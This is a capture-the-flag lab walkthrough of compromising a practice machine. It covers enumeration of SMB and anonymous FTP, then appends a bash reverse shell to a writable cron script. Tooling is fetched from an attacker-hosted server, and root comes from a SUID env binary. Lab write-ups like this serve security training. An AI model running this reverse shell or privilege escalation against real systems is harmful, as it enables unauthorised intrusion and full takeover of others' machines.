# Enumeration

An initial nmap scan reveals that ports 21, 22, 139, and 445 are open. We follow up with a detailed scan of each of these ports.

![7cae030003b7adee3d1094b4f8879168.png](./_resources/7cae030003b7adee3d1094b4f8879168.png)

![50684020a36a4f6a71b2f2d6f7584193.png](./_resources/50684020a36a4f6a71b2f2d6f7584193.png)

![9a2dd2464eb4d9cd2d09dad0d84a635f.png](./_resources/9a2dd2464eb4d9cd2d09dad0d84a635f.png)

Let's enumerate SMB.  We can use SMBmap to quickly get a list of SMB shares; note that we have read only access to one of them.

![674ac68dff5c389dfb23fce1379f1419.png](./_resources/674ac68dff5c389dfb23fce1379f1419.png)
Use SMB client to gain access to the share (just press enter when prompted for a password).

![a1d5f7615e6e7e59f4b6e76e23cca9b7.png](./_resources/a1d5f7615e6e7e59f4b6e76e23cca9b7.png)

Besides a couple of dog pictures, nothing else seems to be on this share. The only other service we discovered was FTP, and we know from our nmap scan that anonymous login is allowed (just press enter for the password). Let's look around.

![0d1a68b329a093d5876f63f2e8834f33.png](./_resources/0d1a68b329a093d5876f63f2e8834f33.png)

![e0e2854afaff39f857aa7d66f7b0e4cf.png](./_resources/e0e2854afaff39f857aa7d66f7b0e4cf.png)

We find a single directory named "scripts" which contains a bash script, a log and a text file. Transfer the files over to the local machine using `get`. The text file is just a reminder to disable anonymous login (oops). We determine from the .sh and .log file that the script is a cleanup script; the log entries all indicate that nothing has been deleted so far. The script seems to check for files in the `/tmp/` directory and deletes them if necessary. Note that we have read, write and execute permissions for this script.

![f2bedec96f45285efb7b528be67fb95c.png](./_resources/f2bedec96f45285efb7b528be67fb95c.png)

<br>

# Exploitation

The shell script we found earlier looks very much like a cron job. Since we have full rwx permissions for the script, we can attempt to replace it with a script of our choosing and wait for it to be executed. We still need initial access, so we will edit the `clean.sh` file and append its contents with `bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1` (which I found from [this useful page](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)). We then set up a netcat listener to catch the reverse shell.

After editing the reverse shell script with our attacker IP and a port of our choosing, we append the reverse shell script to the target's FTP server using `curl ftp://<target IP>/scripts/clean.sh --upload-file clean.sh --append`. Now set up a netcat listener on the appropriate port, and wait for the shell to execute. This will give us initial access to the target machine.

![6eab930e776a309d62fb0ca523a688b4.png](./_resources/6eab930e776a309d62fb0ca523a688b4.png)

![632cb8b1867b04a3af442db2659fe9d3.png](./_resources/632cb8b1867b04a3af442db2659fe9d3.png)

Looking around, we quickly find the user flag.

![e5a5c8e2136e1eb348fbe2590137014b.png](./_resources/e5a5c8e2136e1eb348fbe2590137014b.png)

<br>

# Post-exploitation

We begin looking for methods to escalate our privileges. Let's use LinPEAS to try and find an avenue for privesc. Within the directory containing the `linpeas.sh` file, host a web server on the attacking machine with `python3 -m http.server`. On the target machine, cd into the `/tmp/` directory, download LinPEAS with `wget http://<attacker IP>:8000/linPEAS.sh`, and use `chmod +x linpeas.sh` to make the file executable. Now run LinPEAS with `./linpeas.sh`.

![3f6e971b8124f4ebe47fc291fd88be78.png](./_resources/3f6e971b8124f4ebe47fc291fd88be78.png)

In the SUID section of the LinPEAS output, we find something interesting:

![e563969444c39f3d0d4192719a524660.png](./_resources/e563969444c39f3d0d4192719a524660.png)

Note: We can also run `find / -type f -perm -u=s 2>/dev/null` to look for binaries with the SUID bit set, although LinPEAS highlights potentially useful binaries.

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid), we see that we can use the env binary to escalate privileges when the SUID bit is set (which is the case for us). If we simply use `./env /bin/sh -p` in the directory containing the env binary, we break out of our user shell and spawn a root shell. We then quickly find the root flag.

![0628bf699a7068f9a22779a5d3689569.png](./_resources/0628bf699a7068f9a22779a5d3689569.png)

![4baac96617c9149e24fab4b3a51313a2.png](./_resources/4baac96617c9149e24fab4b3a51313a2.png)